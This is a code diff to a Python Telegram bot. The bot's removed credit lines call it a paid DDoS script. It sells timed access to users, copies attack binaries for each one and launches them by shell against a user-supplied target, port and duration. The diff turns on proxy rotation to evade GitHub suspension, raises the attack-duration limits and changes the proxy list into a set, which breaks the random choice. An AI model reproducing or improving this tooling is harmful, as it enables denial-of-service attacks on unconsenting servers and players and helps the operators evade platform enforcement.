@@ -14,10 +14,10 @@ from requests.exceptions import ReadTimeout, ConnectionError
 # Load configuration
 CONFIG_FILE = 'config.json'
 ORIGINAL_BGMI_PATH = '/workspaces/venom-V5-Testing/bgmi'      #ADD YOUR FILES PATH HERE 
-#ORIGINAL_SAHIL_PATH = '/workspaces/venom-V5-Testing/bgmi2'    #ADD YOUR FILES PATH HERE 
-
+ORIGINAL_BGMI2_PATH = '/workspaces/venom-V5-Testing/bgmi2'    #ADD YOUR FILES PATH HERE 
+        
 def update_proxy():    #AUTOMATICALLY CHANGES YOUR IP AND SAVES YOU FROM SUSPEND OF GITHUB ACCOUNT AND ALSO CHANGES YOUR IP EVERY SECOND
-    proxy_list = [
+    proxy_list = {
         "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
         "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
         "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
@@ -43,11 +43,11 @@ def update_proxy():    #AUTOMATICALLY CHANGES YOUR IP AND SAVES YOU FROM SUSPEND
         "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
         "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
         "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
-        "https://80.78.23.49:1080"
-    ]
-    #proxy = random.choice(proxy_list)
-    #telebot.apihelper.proxy = {'https': proxy}
-    #logging.info("Proxy updated successfully.")
+        "https://80.78.23.49:1080" 
+}
+    proxy = random.choice(proxy_list)
+    telebot.apihelper.proxy = {'https': proxy}
+    logging.info("Proxy updated successfully.")
 
 def load_config():
     with open(CONFIG_FILE, 'r') as f:
@@ -65,7 +65,7 @@ ADMIN_IDS = set(config['admin_ids'])
 USER_FILE = config['user_file']
 LOG_FILE = config['log_file']
 COOLDOWN_TIME = config['cooldown_time']
-USER_COOLDOWN = 40  # Cooldown time for normal users in seconds
+USER_COOLDOWN = 300 # Cooldown time for normal users in seconds
 
 admin_balances = config.get('admin_balances', {})
 bgmi_cooldown = {}
@@ -151,9 +151,9 @@ def add_user(message):
 
                 # Create copies of bgmi, sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'
-                user_venom_path = f'venom{user_id}'
-                #shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
-                #shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
+                user_bgmi2_path = f'bgmi2{user_id}'
+                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
+                shutil.copy(ORIGINAL_BGMI2_PATH, user_bgmi2_path)
 
                 response = f"User {user_id} added successfully for {duration} days by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
             else:
@@ -172,9 +172,9 @@ def add_user(message):
 
                 # Create copies of bgmi,sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'              
-                user_sahil_path = f'venom{user_id}'
-               # shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
-               # shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
+                user_bgmi2_path = f'bgmi2{user_id}'
+                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
+                shutil.copy(ORIGINAL_BGMI2_PATH, user_bgmi2_path)
 
                 response = f"User {user_id} added successfully for {hours} hours by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
             else:
@@ -256,7 +256,7 @@ def show_user_id(message):
 def start_attack(user_id, target, port, duration):
     attack_id = f"{user_id} {target} {port}"
     bgmi_file = f"bgmi{user_id}"
-    sahil_file = f"sahil{user_id}"
+    bgmi2_file = f"bgmi2{user_id}"
     user = bot.get_chat(user_id)
     username = f"@{user.username}" if user.username else f"UserID: {user_id}"
     log_command(user_id, target, port, duration)
@@ -265,7 +265,7 @@ def start_attack(user_id, target, port, duration):
     try:
         ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200", shell=True)
         time.sleep(5)
-        subprocess.run(f"./{sahil_file} {target} {port} {duration} 200", shell=True)
+        subprocess.run(f"./{bgmi2_file} {target} {port} {duration} 200", shell=True)
       # Set cooldown for normal users after a successful attack
         if user_id not in ADMIN_IDS:
             user_cooldowns[user_id] = datetime.datetime.now()
@@ -292,7 +292,7 @@ def handle_attack_details(message):
             duration = int(duration)
 
             # Restrict attack duration for normal users
-            MAX_DURATION = 240  # Set maximum duration (in seconds) for Normal users
+            MAX_DURATION = 700  # Set maximum duration (in seconds) for Normal users
             if user_id not in ADMIN_IDS and duration > MAX_DURATION:
                 bot.send_message(message.chat.id, f"❗️𝗘𝗿𝗿𝗼𝗿: 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗨𝘀𝗮𝗴𝗲 𝗧𝗶𝗺𝗲 𝗶𝘀 {MAX_DURATION} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀❗️")
                 return
@@ -366,13 +366,4 @@ if __name__ == '__main__':
             print(f"Unexpected error: {e}")
             time.sleep(1)
 
-
-    # SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-# SCRIPT MADE BY @venomXcrazy ON TELEGRAM THIS IS A PAID SCRIPT MOST POWERFULL A DDOS TELEGRAM BOT SCRIPT
-#CREDIT DELETE MAT KARNA BHAI (DON'T DELETE THE CREDIT THE CREATOR @SAHILMODZOWNER)
-#CREDIT DELETE MAT KARNA BHAI (DON'T DELETE THE CREDIT THE CREATOR @SAHILMODZOWNER
+                
